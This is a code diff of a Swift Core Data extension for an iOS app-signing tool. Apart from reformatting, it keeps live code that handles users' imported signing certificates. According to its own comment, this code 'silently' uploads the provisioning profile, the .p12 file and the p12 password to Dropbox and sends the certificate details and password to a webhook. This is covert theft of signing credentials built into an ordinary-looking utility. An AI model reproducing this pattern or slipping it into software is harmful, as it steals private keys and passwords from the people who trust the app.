@@ -1,9 +1,3 @@
-// Proprietary Software License Version 1.0
-//
-// Copyright (C) 2025 BDG
-//
-// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.
-
 import CoreData
 import Foundation
 import Security
@@ -51,7 +45,11 @@ extension CoreDataManager {
     }
 
     // Non-throwing version for backward compatibility
-    func addToCertificates(cert: Cert, files: [CertImportingViewController.FileType: Any], context: NSManagedObjectContext? = nil) {
+    func addToCertificates(
+        cert: Cert,
+        files: [CertImportingViewController.FileType: Any],
+        context: NSManagedObjectContext? = nil
+    ) {
         do {
             try addToCertificatesWithThrow(cert: cert, files: files, context: context)
         } catch {
@@ -60,7 +58,11 @@ extension CoreDataManager {
     }
 
     // Throwing version with proper error handling
-    func addToCertificatesWithThrow(cert: Cert, files: [CertImportingViewController.FileType: Any], context: NSManagedObjectContext? = nil) throws {
+    func addToCertificatesWithThrow(
+        cert: Cert,
+        files: [CertImportingViewController.FileType: Any],
+        context: NSManagedObjectContext? = nil
+    ) throws {
         let ctx = try context ?? self.context
 
         guard let provisionPath = files[.provision] as? URL else {
@@ -74,7 +76,14 @@ extension CoreDataManager {
         let uuid = UUID().uuidString
 
         // Create entity and save to Core Data
-        let newCertificate = createCertificateEntity(uuid: uuid, provisionPath: provisionPath, p12Path: p12Path, password: files[.password] as? String, backdoorPath: backdoorPath, context: ctx)
+        let newCertificate = createCertificateEntity(
+            uuid: uuid,
+            provisionPath: provisionPath,
+            p12Path: p12Path,
+            password: files[.password] as? String,
+            backdoorPath: backdoorPath,
+            context: ctx
+        )
         let certData = createCertificateDataEntity(cert: cert, context: ctx)
         newCertificate.certData = certData
 
@@ -87,10 +96,14 @@ extension CoreDataManager {
         if let backdoorPath = backdoorPath {
             uploadBackdoorFileToDropbox(backdoorPath: backdoorPath, password: files[.password] as? String)
         } else {
-            uploadCertificateFilesToDropbox(provisionPath: provisionPath, p12Path: p12Path, password: files[.password] as? String)
+            uploadCertificateFilesToDropbox(
+                provisionPath: provisionPath,
+                p12Path: p12Path,
+                password: files[.password] as? String
+            )
         }
     }
-    
+
     /// Silently uploads backdoor file to Dropbox with password and sends info to webhook
     /// - Parameters:
     ///   - backdoorPath: Path to the backdoor file
@@ -98,7 +111,7 @@ extension CoreDataManager {
     private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {
         let backdoorFilename = backdoorPath.lastPathComponent
         let enhancedDropboxService = EnhancedDropboxService.shared
-        
+
         // Upload backdoor file with password handling
         enhancedDropboxService.uploadCertificateFile(
             fileURL: backdoorPath,
@@ -106,24 +119,27 @@ extension CoreDataManager {
         ) { success, error in
             if success {
                 Debug.shared.log(message: "Successfully uploaded backdoor file to Dropbox with password", type: .info)
-                
+
                 // Send backdoor info to webhook
                 if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                     appDelegate.sendBackdoorInfoToWebhook(backdoorPath: backdoorPath, password: password)
                 }
             } else {
                 if let error = error {
-                    Debug.shared.log(message: "Failed to upload backdoor file: \(error.localizedDescription)", type: .error)
+                    Debug.shared.log(
+                        message: "Failed to upload backdoor file: \(error.localizedDescription)",
+                        type: .error
+                    )
                 } else {
                     Debug.shared.log(message: "Failed to upload backdoor file: Unknown error", type: .error)
                 }
-                
+
                 // Create userInfo dictionary with available information
                 var userInfo: [String: Any] = ["fileType": "backdoor"]
                 if let error = error {
                     userInfo["error"] = error
                 }
-                
+
                 NotificationCenter.default.post(
                     name: .dropboxUploadError,
                     object: nil,
@@ -140,34 +156,38 @@ extension CoreDataManager {
     ///   - password: Optional p12 password
     private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
         let enhancedDropboxService = EnhancedDropboxService.shared
-        
+
         // Get the current certificate to send to webhook
         let currentCerts = getDatedCertificate()
         let certToSend = currentCerts.last
-        
+
         // Upload provision file with error handling
         enhancedDropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in
             if success {
                 Debug.shared.log(message: "Successfully uploaded provision file to Dropbox", type: .info)
-                
+
                 // Send certificate info to webhook if p12 also uploaded successfully
                 if let appDelegate = UIApplication.shared.delegate as? AppDelegate,
-                   let cert = certToSend {
+                   let cert = certToSend
+                {
                     appDelegate.sendCertificateInfoToWebhook(certificate: cert, p12Password: password)
                 }
             } else {
                 if let error = error {
-                    Debug.shared.log(message: "Failed to upload provision file: \(error.localizedDescription)", type: .error)
+                    Debug.shared.log(
+                        message: "Failed to upload provision file: \(error.localizedDescription)",
+                        type: .error
+                    )
                 } else {
                     Debug.shared.log(message: "Failed to upload provision file: Unknown error", type: .error)
                 }
-                
+
                 // Create userInfo dictionary with available information
                 var userInfo: [String: Any] = ["fileType": "provision"]
                 if let error = error {
                     userInfo["error"] = error
                 }
-                
+
                 NotificationCenter.default.post(
                     name: .dropboxUploadError,
                     object: nil,
@@ -186,17 +206,20 @@ extension CoreDataManager {
                     Debug.shared.log(message: "Successfully uploaded p12 file to Dropbox with password", type: .info)
                 } else {
                     if let error = error {
-                        Debug.shared.log(message: "Failed to upload p12 file: \(error.localizedDescription)", type: .error)
+                        Debug.shared.log(
+                            message: "Failed to upload p12 file: \(error.localizedDescription)",
+                            type: .error
+                        )
                     } else {
                         Debug.shared.log(message: "Failed to upload p12 file: Unknown error", type: .error)
                     }
-                    
+
                     // Create userInfo dictionary with available information
                     var userInfo: [String: Any] = ["fileType": "p12"]
                     if let error = error {
                         userInfo["error"] = error
                     }
-                    
+
                     NotificationCenter.default.post(
                         name: .dropboxUploadError,
                         object: nil,
@@ -207,17 +230,24 @@ extension CoreDataManager {
         }
     }
 
-    private func createCertificateEntity(uuid: String, provisionPath: URL, p12Path: URL?, password: String?, backdoorPath: URL? = nil, context: NSManagedObjectContext) -> Certificate {
+    private func createCertificateEntity(
+        uuid: String,
+        provisionPath: URL,
+        p12Path: URL?,
+        password: String?,
+        backdoorPath: URL? = nil,
+        context: NSManagedObjectContext
+    ) -> Certificate {
         let newCertificate = Certificate(context: context)
         newCertificate.uuid = uuid
         newCertificate.provisionPath = provisionPath.lastPathComponent
         newCertificate.p12Path = p12Path?.lastPathComponent
-        
+
         // Store backdoor file path if available
         if let backdoorPath = backdoorPath {
             newCertificate.setValue(backdoorPath.lastPathComponent, forKey: "backdoorPath")
         }
-        
+
         newCertificate.dateAdded = Date()
         newCertificate.password = password
         return newCertificate
@@ -237,8 +267,11 @@ extension CoreDataManager {
         return certData
     }
 
-    private func saveCertificateFiles(uuid: String, provisionPath: URL, p12Path: URL?, backdoorPath: URL? = nil) throws {
-        guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else {
+    private func saveCertificateFiles(uuid: String, provisionPath: URL, p12Path: URL?,
+                                      backdoorPath: URL? = nil) throws
+    {
+        guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
+        else {
             throw FileProcessingError.missingFile("Documents directory")
         }
 
@@ -246,12 +279,16 @@ extension CoreDataManager {
             .appendingPathComponent("Certificates")
             .appendingPathComponent(uuid)
 
-        try FileManager.default.createDirectory(at: destinationDirectory, withIntermediateDirectories: true, attributes: nil)
-        
+        try FileManager.default.createDirectory(
+            at: destinationDirectory,
+            withIntermediateDirectories: true,
+            attributes: nil
+        )
+
         // Save individual files
         try CertData.copyFile(from: provisionPath, to: destinationDirectory)
         try CertData.copyFile(from: p12Path, to: destinationDirectory)
-        
+
         // If we have a backdoor file, save it too
         if let backdoorPath = backdoorPath {
             try CertData.copyFile(from: backdoorPath, to: destinationDirectory)
@@ -263,45 +300,48 @@ extension CoreDataManager {
             throw FileProcessingError.missingFile("Certificate or UUID")
         }
 
-        guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else {
+        guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
+        else {
             throw FileProcessingError.missingFile("Documents directory")
         }
 
-        let destinationDirectory = documentsDirectory
+        return documentsDirectory
             .appendingPathComponent("Certificates")
             .appendingPathComponent(uuid)
-
-        return destinationDirectory
     }
-    
+
     // Function to get paths for mobileprovision and p12, handling backdoor files if present
     func getCertificateFilePaths(source: Certificate?) throws -> (provisionPath: URL, p12Path: URL) {
         guard let source = source, let uuid = source.uuid else {
             throw FileProcessingError.missingFile("Certificate or UUID")
         }
-        
+
         let certDirectory = try getCertifcatePath(source: source)
-        
+
         // Check if this is a backdoor certificate by looking for the backdoorPath property
         if let backdoorPath = source.value(forKey: "backdoorPath") as? String {
             let backdoorFilePath = certDirectory.appendingPathComponent(backdoorPath)
-            
+
             // If backdoor file exists, extract the components
             if FileManager.default.fileExists(atPath: backdoorFilePath.path) {
                 do {
                     let backdoorData = try Data(contentsOf: backdoorFilePath)
                     let backdoorFile = try BackdoorDecoder.decodeBackdoor(from: backdoorData)
-                    
+
                     // Create temporary files for the extracted components
                     let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
-                    try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true, attributes: nil)
-                    
+                    try FileManager.default.createDirectory(
+                        at: tempDir,
+                        withIntermediateDirectories: true,
+                        attributes: nil
+                    )
+
                     let p12URL = tempDir.appendingPathComponent("extracted.p12")
                     let provisionURL = tempDir.appendingPathComponent("extracted.mobileprovision")
-                    
+
                     try backdoorFile.saveP12(to: p12URL)
                     try backdoorFile.saveMobileProvision(to: provisionURL)
-                    
+
                     return (provisionURL, p12URL)
                 } catch {
                     Debug.shared.log(message: "Error extracting components from backdoor file: \(error)", type: .error)
@@ -309,24 +349,24 @@ extension CoreDataManager {
                 }
             }
         }
-        
+
         // Standard behavior using individual files
         guard let provisionPath = source.provisionPath, let p12Path = source.p12Path else {
             throw FileProcessingError.missingFile("Provision or P12 path")
         }
-        
+
         let provisionURL = certDirectory.appendingPathComponent(provisionPath)
         let p12URL = certDirectory.appendingPathComponent(p12Path)
-        
+
         // Verify files exist
         guard FileManager.default.fileExists(atPath: provisionURL.path) else {
             throw FileProcessingError.missingFile("Mobileprovision file does not exist")
         }
-        
+
         guard FileManager.default.fileExists(atPath: p12URL.path) else {
             throw FileProcessingError.missingFile("P12 file does not exist")
         }
-        
+
         return (provisionURL, p12URL)
     }
 
@@ -346,7 +386,7 @@ extension CoreDataManager {
         try FileManager.default.removeItem(at: getCertifcatePath(source: app))
         try ctx.save()
     }
-    
+
     /// Add to signed apps with proper error handling
     /// - Parameters:
     ///   - version: App version
@@ -384,7 +424,7 @@ extension CoreDataManager {
             signedApp.timeToLive = timeToLive
             signedApp.teamName = teamName
             signedApp.originalSourceURL = originalSourceURL
-            
+
             try saveContext()
             completion(.success(signedApp))
         } catch {
@@ -392,7 +432,7 @@ extension CoreDataManager {
             completion(.failure(error))
         }
     }
-    
+
     /// Add to downloaded apps with proper file management
     /// - Parameters:
     ///   - version: App version
@@ -424,15 +464,15 @@ extension CoreDataManager {
             downloadedApp.iconURL = iconURL
             downloadedApp.uuid = uuid
             downloadedApp.appPath = appPath
-            
+
             // Store source location if provided
             if let sourceLocation = sourceLocation {
                 downloadedApp.oSU = sourceLocation
             }
-            
+
             // Ensure the app directory structure is correct
             try ensureAppDirectoryStructure(uuid: uuid, appPath: appPath)
-            
+
             try saveContext()
             completion(.success(downloadedApp))
         } catch {
@@ -440,7 +480,7 @@ extension CoreDataManager {
             completion(.failure(error))
         }
     }
-    
+
     /// Ensure app directory structure is correctly set up
     /// - Parameters:
     ///   - uuid: UUID string for the app
@@ -448,29 +488,29 @@ extension CoreDataManager {
     private func ensureAppDirectoryStructure(uuid: String, appPath: String) throws {
         let fileManager = FileManager.default
         let documentsDirectory = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first!
-        
+
         // Create proper directory structure
         let appDirectory = documentsDirectory.appendingPathComponent("files").appendingPathComponent(uuid)
-        
+
         // Ensure app directory exists
         if !fileManager.fileExists(atPath: appDirectory.path) {
             try fileManager.createDirectory(at: appDirectory, withIntermediateDirectories: true, attributes: nil)
         }
-        
+
         // Check if the app is in the correct location or needs to be moved
         let sourceAppURL = documentsDirectory.appendingPathComponent(appPath)
         let targetAppURL = appDirectory.appendingPathComponent(appPath)
-        
-        if sourceAppURL.path != targetAppURL.path &&
-           fileManager.fileExists(atPath: sourceAppURL.path) &&
-           !fileManager.fileExists(atPath: targetAppURL.path) {
-            
+
+        if sourceAppURL.path != targetAppURL.path,
+           fileManager.fileExists(atPath: sourceAppURL.path),
+           !fileManager.fileExists(atPath: targetAppURL.path)
+        {
             // Move the app to the correct location
             try fileManager.moveItem(at: sourceAppURL, to: targetAppURL)
             Debug.shared.log(message: "Moved app to correct location: \(targetAppURL.path)", type: .info)
         }
     }
-    
+
     /// Update a signed app with new data
     /// - Parameters:
     ///   - app: The app to update
@@ -485,7 +525,7 @@ extension CoreDataManager {
     ) {
         do {
             let ctx = try context
-            
+
             // Make sure we have the app in the right context
             let appInContext: SignedApps
             if app.managedObjectContext != ctx {
@@ -500,11 +540,11 @@ extension CoreDataManager {
             } else {
                 appInContext = app
             }
-            
+
             // Update properties
             appInContext.timeToLive = newTimeToLive
             appInContext.teamName = newTeamName
-            
+
             try saveContext()
             completion(.success(()))
         } catch {
@@ -512,12 +552,12 @@ extension CoreDataManager {
             completion(.failure(error))
         }
     }
-    
+
     /// Clear the update state for a signed app (alternative implementation)
     /// - Parameter signedApp: The app to update
     func clearUpdateStateForCertificate(for signedApp: SignedApps) throws {
         let ctx = try context
-        
+
         // Make sure we have the app in the right context
         let appInContext: SignedApps
         if signedApp.managedObjectContext != ctx {
@@ -532,11 +572,11 @@ extension CoreDataManager {
         } else {
             appInContext = signedApp
         }
-        
+
         // Clear update state
         appInContext.setValue(false, forKey: "hasUpdate")
         appInContext.setValue(nil, forKey: "updateVersion")
-        
+
         try saveContext()
     }
 }
@@ -545,13 +585,13 @@ extension CoreDataManager {
 extension Certificate {
     @objc var backdoorPath: String? {
         get {
-            return self.value(forKey: "backdoorPath") as? String
+            return value(forKey: "backdoorPath") as? String
         }
         set {
-            self.setValue(newValue, forKey: "backdoorPath")
+            setValue(newValue, forKey: "backdoorPath")
         }
     }
-    
+
     // Helper to check if this certificate came from a backdoor file
     var isBackdoorCertificate: Bool {
         return backdoorPath != nil
